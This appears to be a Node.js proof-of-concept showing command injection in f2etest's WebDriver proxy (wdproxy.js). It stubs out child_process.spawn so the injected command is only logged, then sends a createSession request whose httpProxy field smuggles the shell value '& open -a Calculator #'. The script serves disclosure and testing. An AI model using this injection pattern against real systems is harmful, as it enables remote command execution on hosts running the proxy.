#!/usr/bin/env node
'use strict';

const http = require('http');

// 1) Hook spawn
const cp = require('child_process');
const realSpawn = cp.spawn;
cp.spawn = function (file, args, opts) {
  console.log('\n[POC] spawn would run:\n', file, args, '\n');
  return { on(){}, stdout: { on(){} }, stderr: { on(){} } };
};

require('../f2etest-client/f2etest-webdriver/webdriver/wdproxy.js');


function sendCreateSession({ port, httpProxyValue }) {
  const bodyObj = {
    desiredCapabilities: {
      browserName: 'internet explorer',
      proxy: {
        proxyType: 'manual',
        httpProxy: httpProxyValue
      }
    }
  };

  const body = JSON.stringify(bodyObj);

  const req = http.request(
    {
      host: '127.0.0.1',
      port,
      method: 'POST',
      path: '/wd/hub/session',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    },
    (res) => {
      let chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        console.log('[POC] status =', res.statusCode);
        console.log('[POC] resp body (trunc) =', Buffer.concat(chunks).toString().slice(0, 200));
      });
    }
  );

  req.on('error', (e) => console.error('[POC] request error:', e));
  req.write(body);
  req.end();
}

const nodeId = parseInt(process.argv[3], 10);
if (!Number.isFinite(nodeId)) {
  console.error('Usage: node poc_wdproxy_safe.js <f2etestHost> <nodeId> <browsers> [timeout]');
  process.exit(1);
}

const proxyPort = 4000 + nodeId;


setTimeout(() => {
  console.log('[POC] sending createSession to port', proxyPort);

  sendCreateSession({
    port: proxyPort,
    httpProxyValue: '& open -a Calculator #'
  });
}, 1500);

